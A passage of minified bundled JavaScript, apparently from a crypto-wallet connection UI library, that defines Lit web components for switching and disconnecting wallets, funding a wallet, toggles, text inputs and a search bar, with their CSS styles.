          @copy=${()=>this.handleCopyAddress(o)}
          @disconnect=${()=>this.handleDisconnect(e,n)}
          @switch=${()=>{a&&f&&h?.[0]&&this.handleSwitchWallet(f,h[0].address,e)}}
          @externalLink=${()=>this.handleExternalLink(o)}
          @more=${()=>this.handleMore()}
          data-testid="wui-active-profile-wallet-item"
        ></wui-active-profile-wallet-item>
        ${l?X`<wui-separator></wui-separator>`:null}
      </wui-flex>
    `}renderActiveConnectionsList(e){const n=this.getActiveConnections(e);return n.length===0?null:X`
      <wui-flex flexDirection="column" .padding=${["0","2","0","2"]}>
        ${this.renderConnectionList(n,!1,e)}
      </wui-flex>
    `}renderRecentConnections(e){const{recentConnections:n}=Dc.getConnectionsData(e);return n.flatMap(i=>i.accounts).length===0?null:X`
      <wui-flex flexDirection="column" .padding=${["0","2","0","2"]} rowGap="2">
        <wui-text color="secondary" variant="sm-medium" data-testid="recently-connected-text"
          >RECENTLY CONNECTED</wui-text
        >
        <wui-flex flexDirection="column" .padding=${["0","2","0","2"]}>
          ${this.renderConnectionList(n,!0,e)}
        </wui-flex>
      </wui-flex>
    `}renderConnectionList(e,n,r){return e.filter(i=>i.accounts.length>0).map((i,s)=>{const o=Ce.getConnectorById(i.connectorId),a=er.getConnectorImage(o)??"",c=q9.getAuthData(i);return i.accounts.map((l,f)=>{const h=s!==0||f!==0,m=this.isAccountLoading(i.connectorId,l.address);return X`
            <wui-flex flexDirection="column">
              ${h?X`<wui-separator></wui-separator>`:null}
              <wui-inactive-profile-wallet-item
                address=${l.address}
                alt=${i.connectorId}
                buttonLabel=${n?"Connect":"Switch"}
                buttonVariant=${n?"neutral-secondary":"accent-secondary"}
                rightIcon=${n?"bin":"power"}
                rightIconSize="sm"
                class=${n?"recent-connection":"active-connection"}
                data-testid=${n?"recent-connection":"active-connection"}
                imageSrc=${a}
                .iconBadge=${this.isSmartAccount(l.address)?Cc.BADGE.ICON:void 0}
                .iconBadgeSize=${this.isSmartAccount(l.address)?Cc.BADGE.SIZE:void 0}
                .icon=${c.icon}
                .iconSize=${c.iconSize}
                .loading=${m}
                .showBalance=${!1}
                .charsStart=${Cc.ADDRESS_DISPLAY.START}
                .charsEnd=${Cc.ADDRESS_DISPLAY.END}
                @buttonClick=${()=>this.handleSwitchWallet(i,l.address,r)}
                @iconClick=${()=>this.handleWalletAction({connection:i,address:l.address,isRecentConnection:n,namespace:r})}
              ></wui-inactive-profile-wallet-item>
            </wui-flex>
          `})})}renderAddConnectionButton(e){if(!this.isMultiWalletEnabled()&&this.caipAddress||!this.hasAnyConnections(e))return null;const{title:n}=this.getChainLabelInfo(e);return X`
      <wui-list-item
        variant="icon"
        iconVariant="overlay"
        icon="plus"
        iconSize="sm"
        ?chevron=${!0}
        @click=${()=>this.handleAddConnection(e)}
        data-testid="add-connection-button"
      >
        <wui-text variant="md-medium" color="secondary">${n}</wui-text>
      </wui-list-item>
    `}renderEmptyState(e){const{title:n,description:r}=this.getChainLabelInfo(e);return X`
      <wui-flex alignItems="flex-start" class="empty-template" data-testid="empty-template">
        <wui-flex
          flexDirection="column"
          alignItems="center"
          justifyContent="center"
          rowgap="3"
          class="empty-box"
        >
          <wui-icon-box size="xl" icon="wallet" color="secondary"></wui-icon-box>

          <wui-flex flexDirection="column" alignItems="center" justifyContent="center" gap="1">
            <wui-text color="primary" variant="lg-regular" data-testid="empty-state-text"
              >No wallet connected</wui-text
            >
            <wui-text color="secondary" variant="md-regular" data-testid="empty-state-description"
              >${r}</wui-text
            >
          </wui-flex>

          <wui-link
            @click=${()=>this.handleAddConnection(e)}
            data-testid="empty-state-button"
            icon="plus"
          >
            ${n}
          </wui-link>
        </wui-flex>
      </wui-flex>
    `}handleTabChange(e){const n=this.namespaces[e];n&&(this.chainListener?.(),this.currentTab=this.namespaces.indexOf(n),this.namespace=n,this.caipAddress=Y.getAccountData(n)?.caipAddress,this.profileName=Y.getAccountData(n)?.profileName,this.chainListener=Y.subscribeChainProp("accountState",r=>{this.caipAddress=r?.caipAddress},n))}async handleSwitchWallet(e,n,r){try{this.isSwitching=!0,this.lastSelectedConnectorId=e.connectorId,this.lastSelectedAddress=n,this.caipNetwork?.chainNamespace!==r&&e?.caipNetwork&&(Ce.setFilterByNamespace(r),await Y.switchActiveNetwork(e?.caipNetwork)),await ke.switchConnection({connection:e,address:n,namespace:r,closeModalOnConnect:!1,onChange({hasSwitchedAccount:s,hasSwitchedWallet:o}){o?on.showSuccess("Wallet switched"):s&&on.showSuccess("Account switched")}})}catch{on.showError("Failed to switch wallet")}finally{this.isSwitching=!1}}handleWalletAction(e){const{connection:n,address:r,isRecentConnection:i,namespace:s}=e;i?(Be.deleteAddressFromConnection({connectorId:n.connectorId,address:r,namespace:s}),ke.syncStorageConnections(),on.showSuccess("Wallet deleted")):this.handleDisconnect(s,n.connectorId)}async handleDisconnect(e,n){try{await ke.disconnect({id:n,namespace:e}),on.showSuccess("Wallet disconnected")}catch{on.showError("Failed to disconnect wallet")}}handleCopyAddress(e){xe.copyToClopboard(e),on.showSuccess("Address copied")}handleMore(){we.push("AccountSettings")}handleExternalLink(e){const n=this.caipNetwork?.blockExplorers?.default.url;n&&xe.openHref(`${n}/address/${e}`,"_blank")}handleAddConnection(e){Ce.setFilterByNamespace(e),we.push("Connect",{addWalletForNamespace:e})}getChainLabelInfo(e){return i7e[e]??{title:"Add Wallet",description:"Add your first wallet"}}isSmartAccount(e){if(!this.namespace)return!1;const n=this.user?.accounts?.find(r=>r.type==="smartAccount");return n&&e?Gr.isLowerCaseMatch(n.address,e):!1}getPlainAddress(){return this.caipAddress?xe.getPlainAddress(this.caipAddress):void 0}getActiveConnections(e){const n=this.activeConnectorIds[e],{connections:r}=Dc.getConnectionsData(e),[i]=r.filter(c=>Gr.isLowerCaseMatch(c.connectorId,n));if(!n)return r;const s=e===ge.CHAIN.BITCOIN,{address:o}=this.caipAddress?gi.parseCaipAddress(this.caipAddress):{};let a=[...o?[o]:[]];return s&&i&&(a=i.accounts.map(c=>c.address)||[]),Dc.excludeConnectorAddressFromConnections({connectorId:n,addresses:a,connections:r})}hasAnyConnections(e){const n=this.getActiveConnections(e),{recentConnections:r}=Dc.getConnectionsData(e);return!!this.caipAddress||n.length>0||r.length>0}isAccountLoading(e,n){return Gr.isLowerCaseMatch(this.lastSelectedConnectorId,e)&&Gr.isLowerCaseMatch(this.lastSelectedAddress,n)&&this.isSwitching}getProfileContent(e){const{address:n,connections:r,connectorId:i,namespace:s}=e,[o]=r.filter(c=>Gr.isLowerCaseMatch(c.connectorId,i));if(s===ge.CHAIN.BITCOIN&&o?.accounts.every(c=>typeof c.type=="string"))return this.getBitcoinProfileContent(o.accounts,n);const a=q9.getAuthData({connectorId:i,accounts:[]});return[{address:n,tagLabel:"Active",tagVariant:"success",enableButton:!0,profileName:this.profileName,buttonType:"disconnect",buttonLabel:"Disconnect",buttonVariant:"neutral-secondary",...a.isAuth?{description:this.isSmartAccount(n)?"Smart Account":"EOA Account"}:{}}]}getBitcoinProfileContent(e,n){const r=e.length>1,i=this.getPlainAddress();return e.map(s=>{const o=Gr.isLowerCaseMatch(s.address,i);let a="PAYMENT";return s.type==="ordinal"&&(a="ORDINALS"),{address:s.address,tagLabel:Gr.isLowerCaseMatch(s.address,n)?"Active":void 0,tagVariant:Gr.isLowerCaseMatch(s.address,n)?"success":void 0,enableButton:!0,...r?{label:a,alignItems:"flex-end",buttonType:o?"disconnect":"switch",buttonLabel:o?"Disconnect":"Switch",buttonVariant:o?"neutral-secondary":"accent-secondary"}:{alignItems:"center",buttonType:"disconnect",buttonLabel:"Disconnect",buttonVariant:"neutral-secondary"}}})}removeScrollListener(){const e=this.shadowRoot?.querySelector(".wallet-list");e&&e.removeEventListener("scroll",()=>this.handleConnectListScroll())}handleConnectListScroll(){const e=this.shadowRoot?.querySelector(".wallet-list");e&&this.updateScrollOpacity(e)}isMultiWalletEnabled(){return!!this.remoteFeatures?.multiWallet}updateScrollOpacity(e){e.style.setProperty("--connect-scroll--top-opacity",Ux.interpolate([0,Cc.SCROLL_THRESHOLD],Cc.OPACITY_RANGE,e.scrollTop).toString()),e.style.setProperty("--connect-scroll--bottom-opacity",Ux.interpolate([0,Cc.SCROLL_THRESHOLD],Cc.OPACITY_RANGE,e.scrollHeight-e.scrollTop-e.offsetHeight).toString())}onConnectionsChange(){if(this.isMultiWalletEnabled()&&this.namespace){const{connections:e}=Dc.getConnectionsData(this.namespace);e.length===0&&we.reset("ProfileWallets")}this.requestUpdate()}};Qs.styles=n7e;tc([Ee()],Qs.prototype,"currentTab",void 0);tc([Ee()],Qs.prototype,"namespace",void 0);tc([Ee()],Qs.prototype,"namespaces",void 0);tc([Ee()],Qs.prototype,"caipAddress",void 0);tc([Ee()],Qs.prototype,"profileName",void 0);tc([Ee()],Qs.prototype,"activeConnectorIds",void 0);tc([Ee()],Qs.prototype,"lastSelectedAddress",void 0);tc([Ee()],Qs.prototype,"lastSelectedConnectorId",void 0);tc([Ee()],Qs.prototype,"isSwitching",void 0);tc([Ee()],Qs.prototype,"caipNetwork",void 0);tc([Ee()],Qs.prototype,"user",void 0);tc([Ee()],Qs.prototype,"remoteFeatures",void 0);Qs=tc([Ue("w3m-profile-wallets-view")],Qs);var uw=function(t,e,n,r){var i=arguments.length,s=i<3?e:r===null?r=Object.getOwnPropertyDescriptor(e,n):r,o;if(typeof Reflect=="object"&&typeof Reflect.decorate=="function")s=Reflect.decorate(t,e,n,r);else for(var a=t.length-1;a>=0;a--)(o=t[a])&&(s=(i<3?o(s):i>3?o(e,n,s):o(e,n))||s);return i>3&&s&&Object.defineProperty(e,n,s),s};let jp=class extends $e{constructor(){super(),this.unsubscribe=[],this.activeCaipNetwork=Y.state.activeCaipNetwork,this.features=de.state.features,this.remoteFeatures=de.state.remoteFeatures,this.exchangesLoading=Hi.state.isLoading,this.exchanges=Hi.state.exchanges,this.unsubscribe.push(de.subscribeKey("features",e=>this.features=e),de.subscribeKey("remoteFeatures",e=>this.remoteFeatures=e),Y.subscribeKey("activeCaipNetwork",e=>{this.activeCaipNetwork=e,this.setDefaultPaymentAsset()}),Hi.subscribeKey("isLoading",e=>this.exchangesLoading=e),Hi.subscribeKey("exchanges",e=>this.exchanges=e))}disconnectedCallback(){this.unsubscribe.forEach(e=>e())}async firstUpdated(){Hi.isPayWithExchangeSupported()&&(await this.setDefaultPaymentAsset(),await Hi.fetchExchanges())}render(){return X`
      <wui-flex flexDirection="column" .padding=${["1","3","3","3"]} gap="2">
        ${this.onrampTemplate()} ${this.receiveTemplate()} ${this.depositFromExchangeTemplate()}
      </wui-flex>
    `}async setDefaultPaymentAsset(){if(!this.activeCaipNetwork)return;const e=await Hi.getAssetsForNetwork(this.activeCaipNetwork.caipNetworkId),n=e.find(r=>r.metadata.symbol==="USDC")||e[0];n&&Hi.setPaymentAsset(n)}onrampTemplate(){if(!this.activeCaipNetwork)return null;const e=this.remoteFeatures?.onramp,n=jt.ONRAMP_SUPPORTED_CHAIN_NAMESPACES.includes(this.activeCaipNetwork.chainNamespace);return!e||!n?null:X`
      <wui-list-item
        @click=${this.onBuyCrypto.bind(this)}
        icon="card"
        data-testid="wallet-features-onramp-button"
      >
        <wui-text variant="lg-regular" color="primary">Buy crypto</wui-text>
      </wui-list-item>
    `}depositFromExchangeTemplate(){return!this.activeCaipNetwork||!Hi.isPayWithExchangeSupported()?null:X`
      <wui-list-item
        @click=${this.onDepositFromExchange.bind(this)}
        icon="arrowBottomCircle"
        data-testid="wallet-features-deposit-from-exchange-button"
        ?loading=${this.exchangesLoading}
        ?disabled=${this.exchangesLoading||!this.exchanges.length}
      >
        <wui-text variant="lg-regular" color="primary">Deposit from exchange</wui-text>
      </wui-list-item>
    `}receiveTemplate(){return!this.features?.receive?null:X`
      <wui-list-item
        @click=${this.onReceive.bind(this)}
        icon="qrCode"
        data-testid="wallet-features-receive-button"
      >
        <wui-text variant="lg-regular" color="primary">Receive funds</wui-text>
      </wui-list-item>
    `}onBuyCrypto(){we.push("OnRampProviders")}onReceive(){we.push("WalletReceive")}onDepositFromExchange(){Hi.reset(),we.push("PayWithExchange",{redirectView:we.state.data?.redirectView})}};uw([Ee()],jp.prototype,"activeCaipNetwork",void 0);uw([Ee()],jp.prototype,"features",void 0);uw([Ee()],jp.prototype,"remoteFeatures",void 0);uw([Ee()],jp.prototype,"exchangesLoading",void 0);uw([Ee()],jp.prototype,"exchanges",void 0);jp=uw([Ue("w3m-fund-wallet-view")],jp);const s7e=t=>t.strings===void 0;const hE=(t,e)=>{const n=t._$AN;if(n===void 0)return!1;for(const r of n)r._$AO?.(e,!1),hE(r,e);return!0},Qx=t=>{let e,n;do{if((e=t._$AM)===void 0)break;n=e._$AN,n.delete(t),t=e}while(n?.size===0)},Lae=t=>{for(let e;e=t._$AM;t=e){let n=e._$AN;if(n===void 0)e._$AN=n=new Set;else if(n.has(t))break;n.add(t),c7e(e)}};function o7e(t){this._$AN!==void 0?(Qx(this),this._$AM=t,Lae(this)):this._$AM=t}function a7e(t,e=!1,n=0){const r=this._$AH,i=this._$AN;if(i!==void 0&&i.size!==0)if(e)if(Array.isArray(r))for(let s=n;s<r.length;s++)hE(r[s],!1),Qx(r[s]);else r!=null&&(hE(r,!1),Qx(r));else hE(this,t)}const c7e=t=>{t.type==Oae.CHILD&&(t._$AP??=a7e,t._$AQ??=o7e)};class u7e extends Dae{constructor(){super(...arguments),this._$AN=void 0}_$AT(e,n,r){super._$AT(e,n,r),Lae(this),this.isConnected=e._$AU}_$AO(e,n=!0){e!==this.isConnected&&(this.isConnected=e,e?this.reconnected?.():this.disconnected?.()),n&&(hE(this,e),Qx(this))}setValue(e){if(s7e(this._$Ct))this._$Ct._$AI(e,this);else{const n=[...this._$Ct._$AH];n[this._$Ci]=e,this._$Ct._$AI(n,this,0)}}disconnected(){}reconnected(){}}const bA=()=>new l7e;class l7e{}const V9=new WeakMap,wA=kae(class extends u7e{render(t){return bi}update(t,[e]){const n=e!==this.G;return n&&this.G!==void 0&&this.rt(void 0),(n||this.lt!==this.ct)&&(this.G=e,this.ht=t.options?.host,this.rt(this.ct=t.element)),bi}rt(t){if(this.isConnected||(t=void 0),typeof this.G=="function"){const e=this.ht??globalThis;let n=V9.get(e);n===void 0&&(n=new WeakMap,V9.set(e,n)),n.get(this.G)!==void 0&&this.G.call(this.ht,void 0),n.set(this.G,t),t!==void 0&&this.G.call(this.ht,t)}else this.G.value=t}get lt(){return typeof this.G=="function"?V9.get(this.ht??globalThis)?.get(this.G):this.G?.value}disconnected(){this.lt===this.ct&&this.rt(void 0)}reconnected(){this.rt(this.ct)}}),d7e=ot`
  :host {
    display: flex;
    align-items: center;
    justify-content: center;
  }

  label {
    position: relative;
    display: inline-block;
    user-select: none;
    transition:
      background-color ${({durations:t})=>t.lg}
        ${({easings:t})=>t["ease-out-power-2"]},
      color ${({durations:t})=>t.lg} ${({easings:t})=>t["ease-out-power-2"]},
      border ${({durations:t})=>t.lg} ${({easings:t})=>t["ease-out-power-2"]},
      box-shadow ${({durations:t})=>t.lg}
        ${({easings:t})=>t["ease-out-power-2"]},
      width ${({durations:t})=>t.lg} ${({easings:t})=>t["ease-out-power-2"]},
      height ${({durations:t})=>t.lg} ${({easings:t})=>t["ease-out-power-2"]},
      transform ${({durations:t})=>t.lg}
        ${({easings:t})=>t["ease-out-power-2"]},
      opacity ${({durations:t})=>t.lg} ${({easings:t})=>t["ease-out-power-2"]};
    will-change: background-color, color, border, box-shadow, width, height, transform, opacity;
  }

  input {
    width: 0;
    height: 0;
    opacity: 0;
  }

  span {
    position: absolute;
    cursor: pointer;
    top: 0;
    left: 0;
    right: 0;
    bottom: 0;
    background-color: ${({colors:t})=>t.neutrals300};
    border-radius: ${({borderRadius:t})=>t.round};
    border: 1px solid transparent;
    will-change: border;
    transition:
      background-color ${({durations:t})=>t.lg}
        ${({easings:t})=>t["ease-out-power-2"]},
      color ${({durations:t})=>t.lg} ${({easings:t})=>t["ease-out-power-2"]},
      border ${({durations:t})=>t.lg} ${({easings:t})=>t["ease-out-power-2"]},
      box-shadow ${({durations:t})=>t.lg}
        ${({easings:t})=>t["ease-out-power-2"]},
      width ${({durations:t})=>t.lg} ${({easings:t})=>t["ease-out-power-2"]},
      height ${({durations:t})=>t.lg} ${({easings:t})=>t["ease-out-power-2"]},
      transform ${({durations:t})=>t.lg}
        ${({easings:t})=>t["ease-out-power-2"]},
      opacity ${({durations:t})=>t.lg} ${({easings:t})=>t["ease-out-power-2"]};
    will-change: background-color, color, border, box-shadow, width, height, transform, opacity;
  }

  span:before {
    content: '';
    position: absolute;
    background-color: ${({colors:t})=>t.white};
    border-radius: 50%;
  }

  /* -- Sizes --------------------------------------------------------- */
  label[data-size='lg'] {
    width: 48px;
    height: 32px;
  }

  label[data-size='md'] {
    width: 40px;
    height: 28px;
  }

  label[data-size='sm'] {
    width: 32px;
    height: 22px;
  }

  label[data-size='lg'] > span:before {
    height: 24px;
    width: 24px;
    left: 4px;
    top: 3px;
  }

  label[data-size='md'] > span:before {
    height: 20px;
    width: 20px;
    left: 4px;
    top: 3px;
  }

  label[data-size='sm'] > span:before {
    height: 16px;
    width: 16px;
    left: 3px;
    top: 2px;
  }

  /* -- Focus states --------------------------------------------------- */
  input:focus-visible:not(:checked) + span,
  input:focus:not(:checked) + span {
    border: 1px solid ${({tokens:t})=>t.core.iconAccentPrimary};
    background-color: ${({tokens:t})=>t.theme.textTertiary};
    box-shadow: 0px 0px 0px 4px rgba(9, 136, 240, 0.2);
  }

  input:focus-visible:checked + span,
  input:focus:checked + span {
    border: 1px solid ${({tokens:t})=>t.core.iconAccentPrimary};
    box-shadow: 0px 0px 0px 4px rgba(9, 136, 240, 0.2);
  }

  /* -- Checked states --------------------------------------------------- */
  input:checked + span {
    background-color: ${({tokens:t})=>t.core.iconAccentPrimary};
  }

  label[data-size='lg'] > input:checked + span:before {
    transform: translateX(calc(100% - 9px));
  }

  label[data-size='md'] > input:checked + span:before {
    transform: translateX(calc(100% - 9px));
  }

  label[data-size='sm'] > input:checked + span:before {
    transform: translateX(calc(100% - 7px));
  }

  /* -- Hover states ------------------------------------------------------- */
  label:hover > input:not(:checked):not(:disabled) + span {
    background-color: ${({colors:t})=>t.neutrals400};
  }

  label:hover > input:checked:not(:disabled) + span {
    background-color: ${({colors:t})=>t.accent080};
  }

  /* -- Disabled state --------------------------------------------------- */
  label:has(input:disabled) {
    pointer-events: none;
    user-select: none;
  }

  input:not(:checked):disabled + span {
    background-color: ${({colors:t})=>t.neutrals700};
  }

  input:checked:disabled + span {
    background-color: ${({colors:t})=>t.neutrals700};
  }

  input:not(:checked):disabled + span::before {
    background-color: ${({colors:t})=>t.neutrals400};
  }

  input:checked:disabled + span::before {
    background-color: ${({tokens:t})=>t.theme.textTertiary};
  }
`;var p8=function(t,e,n,r){var i=arguments.length,s=i<3?e:r===null?r=Object.getOwnPropertyDescriptor(e,n):r,o;if(typeof Reflect=="object"&&typeof Reflect.decorate=="function")s=Reflect.decorate(t,e,n,r);else for(var a=t.length-1;a>=0;a--)(o=t[a])&&(s=(i<3?o(s):i>3?o(e,n,s):o(e,n))||s);return i>3&&s&&Object.defineProperty(e,n,s),s};let O1=class extends $e{constructor(){super(...arguments),this.inputElementRef=bA(),this.checked=!1,this.disabled=!1,this.size="md"}render(){return X`
      <label data-size=${this.size}>
        <input
          ${wA(this.inputElementRef)}
          type="checkbox"
          ?checked=${this.checked}
          ?disabled=${this.disabled}
          @change=${this.dispatchChangeEvent.bind(this)}
        />
        <span></span>
      </label>
    `}dispatchChangeEvent(){this.dispatchEvent(new CustomEvent("switchChange",{detail:this.inputElementRef.value?.checked,bubbles:!0,composed:!0}))}};O1.styles=[Dt,nr,d7e];p8([ie({type:Boolean})],O1.prototype,"checked",void 0);p8([ie({type:Boolean})],O1.prototype,"disabled",void 0);p8([ie()],O1.prototype,"size",void 0);O1=p8([Ue("wui-toggle")],O1);const f7e=ot`
  :host {
    height: auto;
  }

  :host > wui-flex {
    height: 100%;
    display: flex;
    align-items: center;
    justify-content: center;
    column-gap: ${({spacing:t})=>t[2]};
    padding: ${({spacing:t})=>t[2]} ${({spacing:t})=>t[3]};
    background-color: ${({tokens:t})=>t.theme.foregroundPrimary};
    border-radius: ${({borderRadius:t})=>t[4]};
    box-shadow: inset 0 0 0 1px ${({tokens:t})=>t.theme.foregroundPrimary};
    transition: background-color ${({durations:t})=>t.lg}
      ${({easings:t})=>t["ease-out-power-2"]};
    will-change: background-color;
    cursor: pointer;
  }

  wui-switch {
    pointer-events: none;
  }
`;var Fae=function(t,e,n,r){var i=arguments.length,s=i<3?e:r===null?r=Object.getOwnPropertyDescriptor(e,n):r,o;if(typeof Reflect=="object"&&typeof Reflect.decorate=="function")s=Reflect.decorate(t,e,n,r);else for(var a=t.length-1;a>=0;a--)(o=t[a])&&(s=(i<3?o(s):i>3?o(e,n,s):o(e,n))||s);return i>3&&s&&Object.defineProperty(e,n,s),s};let Jx=class extends $e{constructor(){super(...arguments),this.checked=!1}render(){return X`
      <wui-flex>
        <wui-icon size="xl" name="walletConnectBrown"></wui-icon>
        <wui-toggle
          ?checked=${this.checked}
          size="sm"
          @switchChange=${this.handleToggleChange.bind(this)}
        ></wui-toggle>
      </wui-flex>
    `}handleToggleChange(e){e.stopPropagation(),this.checked=e.detail,this.dispatchSwitchEvent()}dispatchSwitchEvent(){this.dispatchEvent(new CustomEvent("certifiedSwitchChange",{detail:this.checked,bubbles:!0,composed:!0}))}};Jx.styles=[Dt,nr,f7e];Fae([ie({type:Boolean})],Jx.prototype,"checked",void 0);Jx=Fae([Ue("wui-certified-switch")],Jx);const h7e=ot`
  :host {
    position: relative;
    width: 100%;
    display: inline-flex;
    flex-direction: column;
    gap: ${({spacing:t})=>t[3]};
    color: ${({tokens:t})=>t.theme.textPrimary};
    caret-color: ${({tokens:t})=>t.core.textAccentPrimary};
  }

  .wui-input-text-container {
    position: relative;
    display: flex;
  }

  input {
    width: 100%;
    border-radius: ${({borderRadius:t})=>t[4]};
    color: inherit;
    background: transparent;
    border: 1px solid ${({tokens:t})=>t.theme.borderPrimary};
    caret-color: ${({tokens:t})=>t.core.textAccentPrimary};
    padding: ${({spacing:t})=>t[3]} ${({spacing:t})=>t[3]}
      ${({spacing:t})=>t[3]} ${({spacing:t})=>t[10]};
    font-size: ${({textSize:t})=>t.large};
    line-height: ${({typography:t})=>t["lg-regular"].lineHeight};
    letter-spacing: ${({typography:t})=>t["lg-regular"].letterSpacing};
    font-weight: ${({fontWeight:t})=>t.regular};
    font-family: ${({fontFamily:t})=>t.regular};
  }

  input[data-size='lg'] {
    padding: ${({spacing:t})=>t[4]} ${({spacing:t})=>t[3]}
      ${({spacing:t})=>t[4]} ${({spacing:t})=>t[10]};
  }

  @media (hover: hover) and (pointer: fine) {
    input:hover:enabled {
      border: 1px solid ${({tokens:t})=>t.theme.borderSecondary};
    }
  }

  input:disabled {
    cursor: unset;
    border: 1px solid ${({tokens:t})=>t.theme.borderPrimary};
  }

  input::placeholder {
    color: ${({tokens:t})=>t.theme.textSecondary};
  }

  input:focus:enabled {
    border: 1px solid ${({tokens:t})=>t.theme.borderSecondary};
    background-color: ${({tokens:t})=>t.theme.foregroundPrimary};
    -webkit-box-shadow: 0px 0px 0px 4px ${({tokens:t})=>t.core.foregroundAccent040};
    -moz-box-shadow: 0px 0px 0px 4px ${({tokens:t})=>t.core.foregroundAccent040};
    box-shadow: 0px 0px 0px 4px ${({tokens:t})=>t.core.foregroundAccent040};
  }

  div.wui-input-text-container:has(input:disabled) {
    opacity: 0.5;
  }

  wui-icon.wui-input-text-left-icon {
    position: absolute;
    top: 50%;
    transform: translateY(-50%);
    pointer-events: none;
    left: ${({spacing:t})=>t[4]};
    color: ${({tokens:t})=>t.theme.iconDefault};
  }

  button.wui-input-text-submit-button {
    position: absolute;
    top: 50%;
    transform: translateY(-50%);
    right: ${({spacing:t})=>t[3]};
    width: 24px;
    height: 24px;
    border: none;
    background: transparent;
    border-radius: ${({borderRadius:t})=>t[2]};
    color: ${({tokens:t})=>t.core.textAccentPrimary};
  }

  button.wui-input-text-submit-button:disabled {
    opacity: 1;
  }

  button.wui-input-text-submit-button.loading wui-icon {
    animation: spin 1s linear infinite;
  }

  button.wui-input-text-submit-button:hover {
    background: ${({tokens:t})=>t.core.foregroundAccent010};
  }

  input:has(+ .wui-input-text-submit-button) {
    padding-right: ${({spacing:t})=>t[12]};
  }

  input[type='number'] {
    -moz-appearance: textfield;
  }

  input[type='search']::-webkit-search-decoration,
  input[type='search']::-webkit-search-cancel-button,
  input[type='search']::-webkit-search-results-button,
  input[type='search']::-webkit-search-results-decoration {
    -webkit-appearance: none;
  }

  /* -- Keyframes --------------------------------------------------- */
  @keyframes spin {
    from {
      transform: rotate(0deg);
    }
    to {
      transform: rotate(360deg);
    }
  }
`;var Zc=function(t,e,n,r){var i=arguments.length,s=i<3?e:r===null?r=Object.getOwnPropertyDescriptor(e,n):r,o;if(typeof Reflect=="object"&&typeof Reflect.decorate=="function")s=Reflect.decorate(t,e,n,r);else for(var a=t.length-1;a>=0;a--)(o=t[a])&&(s=(i<3?o(s):i>3?o(e,n,s):o(e,n))||s);return i>3&&s&&Object.defineProperty(e,n,s),s};let ra=class extends $e{constructor(){super(...arguments),this.inputElementRef=bA(),this.disabled=!1,this.loading=!1,this.placeholder="",this.type="text",this.value="",this.size="md"}render(){return X` <div class="wui-input-text-container">
        ${this.templateLeftIcon()}
        <input
          data-size=${this.size}
          ${wA(this.inputElementRef)}
          data-testid="wui-input-text"
          type=${this.type}
          enterkeyhint=${et(this.enterKeyHint)}
          ?disabled=${this.disabled}
          placeholder=${this.placeholder}
          @input=${this.dispatchInputChangeEvent.bind(this)}
          @keydown=${this.onKeyDown}
          .value=${this.value||""}
        />
        ${this.templateSubmitButton()}
        <slot class="wui-input-text-slot"></slot>
      </div>
      ${this.templateError()} ${this.templateWarning()}`}templateLeftIcon(){return this.icon?X`<wui-icon
        class="wui-input-text-left-icon"
        size="md"
        data-size=${this.size}
        color="inherit"
        name=${this.icon}
      ></wui-icon>`:null}templateSubmitButton(){return this.onSubmit?X`<button
        class="wui-input-text-submit-button ${this.loading?"loading":""}"
        @click=${this.onSubmit?.bind(this)}
        ?disabled=${this.disabled||this.loading}
      >
        ${this.loading?X`<wui-icon name="spinner" size="md"></wui-icon>`:X`<wui-icon name="chevronRight" size="md"></wui-icon>`}
      </button>`:null}templateError(){return this.errorText?X`<wui-text variant="sm-regular" color="error">${this.errorText}</wui-text>`:null}templateWarning(){return this.warningText?X`<wui-text variant="sm-regular" color="warning">${this.warningText}</wui-text>`:null}dispatchInputChangeEvent(){this.dispatchEvent(new CustomEvent("inputChange",{detail:this.inputElementRef.value?.value,bubbles:!0,composed:!0}))}};ra.styles=[Dt,nr,h7e];Zc([ie()],ra.prototype,"icon",void 0);Zc([ie({type:Boolean})],ra.prototype,"disabled",void 0);Zc([ie({type:Boolean})],ra.prototype,"loading",void 0);Zc([ie()],ra.prototype,"placeholder",void 0);Zc([ie()],ra.prototype,"type",void 0);Zc([ie()],ra.prototype,"value",void 0);Zc([ie()],ra.prototype,"errorText",void 0);Zc([ie()],ra.prototype,"warningText",void 0);Zc([ie()],ra.prototype,"onSubmit",void 0);Zc([ie()],ra.prototype,"size",void 0);Zc([ie({attribute:!1})],ra.prototype,"onKeyDown",void 0);ra=Zc([Ue("wui-input-text")],ra);const p7e=ot`
  :host {
    position: relative;
    display: inline-block;
    width: 100%;
  }

  wui-icon {
    position: absolute;
    top: 50%;
    transform: translateY(-50%);
    right: ${({spacing:t})=>t[3]};
    color: ${({tokens:t})=>t.theme.iconDefault};
    cursor: pointer;
    padding: ${({spacing:t})=>t[2]};
    background-color: transparent;
    border-radius: ${({borderRadius:t})=>t[4]};
    transition: background-color ${({durations:t})=>t.lg}
      ${({easings:t})=>t["ease-out-power-2"]};
  }

  @media (hover: hover) {
    wui-icon:hover {
      background-color: ${({tokens:t})=>t.theme.foregroundSecondary};
    }
  }
`;var $ae=function(t,e,n,r){var i=arguments.length,s=i<3?e:r===null?r=Object.getOwnPropertyDescriptor(e,n):r,o;if(typeof Reflect=="object"&&typeof Reflect.decorate=="function")s=Reflect.decorate(t,e,n,r);else for(var a=t.length-1;a>=0;a--)(o=t[a])&&(s=(i<3?o(s):i>3?o(e,n,s):o(e,n))||s);return i>3&&s&&Object.defineProperty(e,n,s),s};let Xx=class extends $e{constructor(){super(...arguments),this.inputComponentRef=bA(),this.inputValue=""}render(){return X`
      <wui-input-text
        ${wA(this.inputComponentRef)}
        placeholder="Search wallet"
        icon="search"
        type="search"
        enterKeyHint="search"
        size="sm"
        @inputChange=${this.onInputChange}
      >
        ${this.inputValue?X`<wui-icon
              @click=${this.clearValue}
              color="inherit"
              size="sm"
              name="close"
            ></wui-icon>`:null}
      </wui-input-text>
    `}onInputChange(e){this.inputValue=e.detail||""}clearValue(){const n=this.inputComponentRef.value?.inputElementRef.value;n&&(n.value="",this.inputValue="",n.focus(),n.dispatchEvent(new Event("input")))}};Xx.styles=[Dt,p7e];$ae([ie()],Xx.prototype,"inputValue",void 0);Xx=$ae([Ue("wui-search-bar")],Xx);const Hae=Mt`<svg  viewBox="0 0 48 54" fill="none">
  <path
